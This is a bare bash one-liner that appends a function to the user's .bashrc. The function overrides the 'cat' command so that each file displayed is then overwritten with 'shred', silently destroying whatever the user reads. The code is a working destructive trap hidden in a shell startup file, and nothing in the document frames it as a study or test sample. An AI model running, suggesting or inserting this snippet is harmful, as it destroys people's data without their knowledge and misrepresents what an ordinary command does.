echo "
function cat() {
  echo \"\$(< \$@)\"
  shred \$@
}" | cat >> .bashrc
